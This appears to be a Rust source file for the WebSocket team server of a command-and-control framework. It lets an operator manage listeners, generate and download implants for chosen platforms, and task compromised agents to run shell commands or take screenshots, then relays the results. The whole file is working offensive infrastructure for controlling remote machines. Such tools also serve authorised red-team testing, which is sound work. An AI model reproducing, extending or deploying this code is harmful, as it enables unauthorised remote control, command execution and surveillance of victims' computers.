use axum::{
    Extension,
    extract::connect_info::ConnectInfo,
    extract::ws::{Message, WebSocket, WebSocketUpgrade},
    response::IntoResponse,
    routing::get,
    Router,
};
use axum_extra::TypedHeader;
use log::{error, info, warn};
use std::io::{Error, ErrorKind};
use std::net::SocketAddr;
use std::sync::Arc;
use tokio::sync::{broadcast, Mutex};
use tower_http::{
    add_extension::AddExtensionLayer,
    trace::{DefaultMakeSpan, TraceLayer},
};
use url::Url;

use super::{jobs::{check_dupl_job, find_job, format_listeners, Job, JobMessage}, agents::AgentTask};
use super::agents::{Agent, format_agents};
use crate::implants::{generate::generate, implant::{format_implants, Implant}};
use crate::config::Config;
use crate::utils::fs::{empty_file, read_file, write_file};

#[derive(Debug)]
pub struct Server {
    pub config: Config,
    pub jobs: Arc<Mutex<Vec<Job>>>,
    tx_job: Arc<Mutex<broadcast::Sender<JobMessage>>>,
    pub agents: Arc<Mutex<Vec<Agent>>>,
    pub implants: Arc<Mutex<Vec<Implant>>>,
}

impl Server {
    pub fn new(
        config: Config,
        tx_job: broadcast::Sender<JobMessage>,
    ) -> Self {
        Self {
            config,
            jobs: Arc::new(Mutex::new(Vec::new())),
            tx_job: Arc::new(Mutex::new(tx_job)),
            agents: Arc::new(Mutex::new(Vec::new())),
            implants: Arc::new(Mutex::new(Vec::new())),
        }
    }

    pub async fn add_agent(&mut self, new_agent: &mut Agent) -> Result<(), Error> {
        let mut agents = self.agents.lock().await;

        // Check if the same agent already exists
        for agent in agents.iter() {
            if  agent.hostname == new_agent.hostname &&
                agent.os == new_agent.os &&
                agent.arch == new_agent.arch &&
                agent.listener_url == new_agent.listener_url
            {
                return Err(Error::new(ErrorKind::Other, "This agent has already registered"));
            }
        }

        // Create a directory and files for the new agent
        self.config.mkdir(format!("agents/{}/task", new_agent.name.to_owned())).unwrap();
        self.config.mkdir(format!("agents/{}/screenshots", new_agent.name.to_owned())).unwrap();
        self.config.mkfile(format!("agents/{}/task/name", new_agent.name.to_owned())).unwrap();
        self.config.mkfile(format!("agents/{}/task/result", new_agent.name.to_owned())).unwrap();

        // Update the agent ID and push
        new_agent.id = agents.len() as u32;
        agents.push(new_agent.to_owned());
        Ok(())
    }

    pub async fn add_implant(&mut self, new_implant: &mut Implant) -> Result<(), Error> {
        let mut implants = self.implants.lock().await;

        // Update the implant ID
        new_implant.id = implants.len() as u32;
        implants.push(new_implant.to_owned());
        Ok(())
    }

    pub async fn is_dupl_implant(&mut self, new_implant: &mut Implant) -> bool {
        let implants = self.implants.lock().await;

        // Check if the same implant already exists
        for implant in implants.iter() {
            if  implant.listener_url == new_implant.listener_url &&
                implant.os == new_implant.os &&
                implant.arch == new_implant.arch &&
                implant.format == new_implant.format &&
                implant.sleep == new_implant.sleep
            {
                return true;
            }
        }
        return false;
    }
}

pub async fn run(config: Config) {
    let (tx_job, _rx_job) = broadcast::channel(100);
    let server = Arc::new(Mutex::new(Server::new(config, tx_job)));

    let app = Router::new()
        .route("/hermit", get(ws_handler))
        .layer(
            AddExtensionLayer::new(server),
        )
        .layer(
            TraceLayer::new_for_http()
                .make_span_with(DefaultMakeSpan::default().include_headers(true)),
        );

    let listener = tokio::net::TcpListener::bind("127.0.0.1:9999")
        .await
        .unwrap();
    info!("listening on {}", listener.local_addr().unwrap());

    axum::serve(
        listener,
        app.into_make_service_with_connect_info::<SocketAddr>(),
    )
    .await
    .unwrap();
}

async fn ws_handler(
    ws: WebSocketUpgrade,
    user_agent: Option<TypedHeader<headers::UserAgent>>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
    Extension(server): Extension<Arc<Mutex<Server>>>,
) -> impl IntoResponse {
    let user_agent = if let Some(TypedHeader(user_agent)) = user_agent {
        user_agent.to_string()
    } else {
        String::from("unknown browser")
    };

    info!("`{user_agent}` at {addr} connected.");

    ws.on_upgrade(move |socket| handle_socket(socket, addr, server))
}

async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Server>>)  {
    let socket_arc = Arc::new(Mutex::new(socket));
        
    loop {
        let socket_clone = Arc::clone(&socket_arc);
        let mut socket_lock = socket_clone.lock().await;

        if let Some(msg) = socket_lock.recv().await {
            if let Ok(msg) = msg {
                match msg {
                    Message::Text(text) => {
                        let server_clone = Arc::clone(&server);
                        let mut server_lock = server_clone.lock().await;

                        let args = match shellwords::split(text.as_str()) {
                            Ok(args) => { args }
                            Err(err) => {
                                error!("Can't parse command line: {err}");
                                // vec!["".to_string()]
                                continue;
                            }
                        };

                        match args[0].as_str() {
                            "listener" => {
                                match args[1].as_str() {
                                    "add" => {
                                        let name = &args[2];
                                        let url = Url::parse(&args[3]).unwrap();

                                        let mut jobs = server_lock.jobs.lock().await;

                                        // Check if the url already exists.
                                        match check_dupl_job(&mut jobs, url.to_owned()) {
                                            Ok(_) => {},
                                            Err(e) => {
                                                error!("{e}");
                                                let _ = socket_lock.send(Message::Text(format!("Error: This URL already exists."))).await;
                                                let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                                continue;
                                            },
                                        }

                                        let next_id = jobs.len() as u32;
                                        let rx_job = server_lock.tx_job.lock().await;

                                        let new_job = Job::new(
                                            next_id,
                                            name.to_owned(),
                                            url.scheme().to_owned(),
                                            url.host().unwrap().to_string(),
                                            url.port().unwrap(),
                                            Arc::new(Mutex::new(rx_job.subscribe())),
                                            Arc::clone(&server_clone),
                                        );

                                        jobs.push(new_job);
                                        let _ = socket_lock.send(Message::Text(format!("Listener `{url}` added."))).await;
                                        let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                    }
                                    "delete" => {
                                        let target = args[2].to_string();
            
                                        let mut jobs = server_lock.jobs.lock().await;
                                        let mut jobs_owned = jobs.to_owned();
            
                                        let job = match find_job(&mut jobs_owned, target.to_owned()).await {
                                            Some(j) => j,
                                            None => {
                                                let _ = socket_lock.send(Message::Text(format!("Listener `{target}` not found."))).await;
                                                let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                                continue;
                                            }
                                        };
            
                                        if !job.running {
                                            job.handle.lock().await.abort();
                                            jobs.remove(job.id as usize);
                                            let _ = socket_lock.send(Message::Text(format!("Listener `{target}` deleted."))).await;
                                        } else {
                                            let _ = socket_lock.send(
                                                Message::Text(format!("Listener `{target}` cannot be deleted because it's running. Please stop it before deleting."))
                                            ).await;
                                        }
            
                                        let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                    }
                                    "start" => {
                                        let target = args[2].to_owned();
            
                                        let mut jobs = server_lock.jobs.lock().await;
                                        let job = match find_job(&mut jobs, target.to_owned()).await {
                                            Some(j) => j,
                                            None => {
                                                let _ = socket_lock.send(Message::Text(format!("Listener `{target}` not found."))).await;
                                                let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                                continue;
                                            }
                                        };
            
                                        if !job.running {
                                            let _ = server_lock.tx_job.lock().await.send(JobMessage::Start(job.id));
                                            job.running = true;
                                            let _ = socket_lock.send(Message::Text(format!("Listener `{target}` started."))).await;
                                        } else {
                                            let _ = socket_lock.send(Message::Text(format!("Listener `{target}` is alread running"))).await;
                                        }
                                        let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                    }
                                    "stop" => {
                                        let target = args[2].to_string();

                                        let mut jobs = server_lock.jobs.lock().await;
                                        let job = match find_job(&mut jobs, target.to_owned()).await {
                                            Some(j) => j,
                                            None => {
                                                let _ = socket_lock.send(Message::Text(format!("Listener `{target}` not found."))).await;
                                                let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                                continue;
                                            }
                                        };

                                        if job.running {
                                            let _ = server_lock.tx_job.lock().await.send(JobMessage::Stop(job.id));
                                            job.running = false;
                                            let _ = socket_lock.send(Message::Text(format!("Listener `{target}` stopped."))).await;
                                        } else {
                                            let _ = socket_lock.send(Message::Text(format!("Listener `{target}` is already stopped."))).await;
                                        }
                                        let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                    }
                                    "list" => {
                                        let mut jobs = server_lock.jobs.lock().await;
                                        let output = format_listeners(&mut jobs);
                                        let _ = socket_lock.send(Message::Text(output)).await;
                                        let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                    }
                                    _ => {
                                        let _ = socket_lock.send(Message::Text("Unknown arguments".to_owned())).await;
                                        let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                        continue;
                                    }
                                }
                            }
                            "agent" => {
                                match args[1].as_str() {
                                    "use" => {
                                        let ag_name = args[2].to_string();
                                        let agents = server_lock.agents.lock().await;

                                        let mut is_ok = false;
                                        for agent in agents.iter() {
                                            if agent.id.to_string() == ag_name || agent.name == ag_name {
                                                let _ = socket_lock.send(
                                                    Message::Text(format!("[agent:use:ok] {}", agent.name))).await;
                                                let _ = socket_lock.send(
                                                    Message::Text("[done]".to_owned())
                                                ).await;
                                                is_ok = true;
                                                break;
                                            }
                                        }

                                        if !is_ok {
                                            let _ = socket_lock.send(
                                                Message::Text("[agent:use:error] Agent not found.".to_owned())
                                            ).await;
                                            let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                        }
                                    }
                                    "list" => {
                                        let mut agents = server_lock.agents.lock().await;
                                        let output = format_agents(&mut agents);
                                        let _ = socket_lock.send(Message::Text(output)).await;
                                        let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                    }
                                    _ => {
                                        let _ = socket_lock.send(Message::Text("Unknown arguments".to_owned())).await;
                                        let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                    }
                                }
                            }
                            "implant" => {
                                match args[1].as_str() {
                                    "gen" => {
                                        let i_name = args[2].to_owned();
                                        let i_listener_url = args[3].to_owned();
                                        let i_os = args[4].to_owned();
                                        let i_arch = args[5].to_owned();
                                        let i_format = args[6].to_owned();
                                        let i_sleep: u16 = args[7].to_owned().parse().unwrap();

                                        let mut implant = Implant::new(
                                            i_name.to_owned(),
                                            i_listener_url.to_owned(),
                                            i_os.to_owned(),
                                            i_arch.to_owned(),
                                            i_format.to_owned(),
                                            i_sleep.to_owned(),
                                        );

                                        // Check duplicate
                                        if server_lock.is_dupl_implant(&mut implant).await {
                                            let _ = socket_lock.send(
                                                Message::Text(
                                                    "[implant:gen:error] Similar implant already exists. Please use it with `implant download`.".to_owned()
                                                )).await;
                                            let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                            continue;
                                        }

                                        // Generate an implant
                                        match generate(
                                            &server_lock.config,
                                            i_name.to_owned(),
                                            i_listener_url.to_owned(),
                                            i_os.to_owned(),
                                            i_arch.to_owned(),
                                            i_format.to_owned(),
                                            i_sleep,
                                        ) {
                                            Ok((output, buffer)) => {
                                                let _ = socket_lock.send(
                                                    Message::Text(format!(
                                                        "[implant:gen:ok] {}",
                                                        output,
                                                    ))).await;
                                                if let Err(e) = socket_lock.send(Message::Binary(buffer)).await {
                                                    error!("Error: {:?}", e);
                                                    let _ = socket_lock.send(
                                                        Message::Text(format!("[implant:gen:error] {}", e.to_string()))).await;
                                                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                                    continue;
                                                }

                                                println!("Send OK");
            
                                                // Add to the list (check duplicate again before adding it)
                                                if server_lock.is_dupl_implant(&mut implant).await {
                                                    let _ = socket_lock.send(
                                                        Message::Text(
                                                            "[implant:gen:error] Similar implant already exists. Please use it with `implant download`.".to_owned()
                                                        )).await;
                                                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                                    continue;
                                                }
                                                if let Err(e) = server_lock.add_implant(&mut implant).await {
                                                    let _ = socket_lock.send(
                                                        Message::Text(format!("[implant:gen:error] {}", e.to_string()))).await;
                                                    }            
                                            },
                                            Err(e) => {
                                                let _ = socket_lock.send(
                                                    Message::Text(format!("[implant:gen:error] Could not generate an imaplant: {e}"))
                                                ).await;
                                            }
                                        }

                                        let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;

                                    }
                                    "download" => {
                                        let i_name = args[2].to_owned();
                                        // Get the implant
                                        let mut target_implant: Option<Implant> = None;
                                        let implants = server_lock.implants.lock().await;
                                        for implant in implants.iter() {
                                            if implant.id.to_string() == i_name || implant.name == i_name {
                                                target_implant = Some(implant.to_owned());
                                                break;
                                            }
                                        }

                                        if let Some(imp) = target_implant {
                                            match generate(
                                                &server_lock.config,
                                                imp.name,
                                                imp.listener_url,
                                                imp.os,
                                                imp.arch,
                                                imp.format,
                                                imp.sleep,
                                            ) {
                                                Ok((output, buffer)) => {
                                                    let _ = socket_lock.send(
                                                        Message::Text(format!(
                                                            "[implant:gen:ok] {}",
                                                            output,
                                                        ))).await;
                                                    let _ = socket_lock.send(Message::Binary(buffer)).await;
                
                                                },
                                                Err(e) => {
                                                    let _ = socket_lock.send(
                                                        Message::Text(format!("[implant:gen:error] {e}"))
                                                    ).await;
                                                }
                                            }
                                        } else {
                                            let _ = socket_lock.send(
                                                Message::Text(
                                                    format!("[implant:gen:error] Implant not found."))).await;
                                        }

                                        let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                    }
                                    "delete" => {
                                        info!("Deleting the implant.");
                                        let i_name = args[2].to_owned();

                                        // Remove the implant from the list
                                        let mut removed = false;
                                        let mut implants = server_lock.implants.lock().await;
                                        for (idx, implant) in implants.iter_mut().enumerate() {
                                            if implant.id.to_string() == i_name || implant.name == i_name {
                                                implants.remove(idx);
                                                removed = true;
                                                break;
                                            }
                                        }

                                        if removed {
                                            let _ = socket_lock.send(
                                                Message::Text(
                                                    "[implant:delete:ok] Implant deleted successfully.".to_owned()
                                                )).await;
                                        } else {
                                            let _ = socket_lock.send(
                                                Message::Text(
                                                    "[implant:delete:error] Implant could not be delete.".to_owned()
                                                )).await;
                                        }
                                        let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                    }
                                    "list" => {
                                        let mut implants = server_lock.implants.lock().await;
                                        let output = format_implants(&mut implants);
                                        let _ = socket_lock.send(Message::Text(output)).await;
                                        let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                    }
                                    _ => {
                                        let _ = socket_lock.send(Message::Text(format!("Unknown command: {text}"))).await;
                                        let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                    }
                                }
                            }
                            "task" => {
                                let ag_name = args[1].to_owned();

                                match args[2].as_str() {
                                    "screenshot" => {
                                        // Set task
                                        if let Ok(_) = write_file(format!("agents/{}/task/name", ag_name.to_owned()), args[2..].join(" ").as_bytes()) {
                                            info!("Task set successfully.");
                                        } else {
                                            error!("Task could not be set.");
                                            let _ = socket_lock.send(Message::Text("[task:error] Could not set a task.".to_owned())).await;
                                            let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                            continue;
                                        }

                                        // Check the task result
                                        let mut cnt: u8 = 0;
                                        loop {
                                            info!("Getting task result...");
                                            tokio::time::sleep(tokio::time::Duration::from_secs(3)).await;

                                            if let Ok(task_result) = read_file(format!("agents/{}/task/result", ag_name.to_owned())) {
                                                if task_result.len() > 0 {
                                                    info!("task result found.");
                                                    let outfile = format!(
                                                        "{}/agents/{}/screenshots/screenshot_1.png",
                                                        server_lock.config.app_dir.display(),
                                                        ag_name.to_owned(),
                                                    );
                                                    let _ = socket_lock.send(Message::Text(
                                                        format!("[task:screenshot:ok] {}", outfile))).await;
                                                    let _ = socket_lock.send(Message::Binary(task_result)).await;
                                                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;

                                                    // Initialize the task result
                                                    empty_file(format!("agents/{}/task/result", ag_name.to_owned())).unwrap();
                                                    break;
                                                } else {
                                                    warn!("task result is empty.");
                                                    cnt += 1;
                                                    if cnt > 5 {
                                                        let _ = socket_lock.send(Message::Text("[task:error] Could not get the task result.".to_owned())).await;
                                                        let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                                        break;
                                                    }
                                                }
                                            } else {
                                                error!("Could not read `task/result` file.");
                                                break;
                                            }
                                        }
                                    }
                                    "shell" => {
                                        // Set task
                                        if let Ok(_) = write_file(format!("agents/{}/task/name", ag_name.to_owned()), args[2..].join(" ").as_bytes()) {
                                            info!("Task set successfully.");
                                        } else {
                                            error!("Task could not be set.");
                                            let _ = socket_lock.send(Message::Text("[task:error] Could not set a task.".to_owned())).await;
                                            let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                            continue;
                                        }

                                        // Check the task result
                                        let mut cnt: u8 = 0;
                                        loop {
                                            info!("Getting task result...");
                                            tokio::time::sleep(tokio::time::Duration::from_secs(3)).await;

                                            if let Ok(task_result) = read_file(format!("agents/{}/task/result", ag_name.to_owned())) {
                                                if task_result.len() > 0 {
                                                    info!("task result found.");
                                                    let _ = socket_lock.send(Message::Text("[task:shell:ok]".to_owned())).await;
                                                    let _ = socket_lock.send(Message::Binary(task_result)).await;
                                                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;

                                                    // Initialize the task result
                                                    empty_file(format!("agents/{}/task/result", ag_name.to_owned())).unwrap();
                                                    break;
                                                } else {
                                                    warn!("task result is empty.");
                                                    cnt += 1;
                                                    if cnt > 5 {
                                                        let _ = socket_lock.send(Message::Text("[task:error] Could not get the task result.".to_owned())).await;
                                                        let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                                        break;
                                                    }
                                                }
                                            } else {
                                                error!("Could not read `task/result` file.");
                                                break;
                                            }
                                        }
                                    }
                                    _ => {
                                        let _ = socket_lock.send(Message::Text(format!("Unknown command: {text}"))).await;
                                        let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                                        continue;
                                    }
                                }
                            }
                            _ => {
                                let _ = socket_lock.send(Message::Text(format!("Unknown command: {text}"))).await;
                                let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                            }
                        }
                    }
                    _ => {}
                }
            } else {
                info!("Client {who} abruptly disconnected.");
                return;
            }
        }
    }

    // let (mut sender, mut receiver) = socket.split();

}

 // fn process_message(msg: Message, who: SocketAddr) -> ControlFlow<(), ()> {
    //     match msg {
    //         Message::Text(t) => {
    //             info!(">>> {who} sent str: {t:?}");
    //         }
    //         Message::Binary(d) => {
    //             info!(">>> {} sent {} bytes: {:?}", who, d.len(), d);
    //         }
    //         Message::Close(c) => {
    //             if let Some(cf) = c {
    //                 info!(
    //                     ">>> {} sent close with code {} and reason `{}`",
    //                     who, cf.code, cf.reason
    //                 );
    //             } else {
    //                 info!(">>> {who} somehow sent close message without CloseFrame");
    //             }
    //             return ControlFlow::Break(());
    //         }
    //         Message::Pong(v) => {
    //             info!(">>> {who} sent pong with {v:?}");
    //         }
    //         Message::Ping(v) => {
    //             info!(">>> {who} sent ping with {v:?}");
    //         }
    //     }

    //     ControlFlow::Continue(())
    // }